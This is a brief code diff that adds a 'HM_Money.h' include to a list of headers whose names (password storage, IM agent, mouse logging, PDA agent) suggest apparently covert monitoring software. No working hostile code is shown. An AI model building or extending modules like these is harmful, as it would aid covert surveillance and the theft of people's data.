@@ -128,6 +128,7 @@ void UnlockConfFile();
 #include "HM_Pstorage.h" // XXX da modificare 
 #include "HM_IMAgent.h" // XXX da modificare 
 #include "HM_LogDevice.h" // XXX da modificare 
+#include "HM_Money.h" // XXX da modificare 
 #include "HM_MouseLog.h" // XXX da modificare
 #include "HM_Application.h" // XXX da modificare
 #include "HM_PDAAGent.h" // XXX da modificare
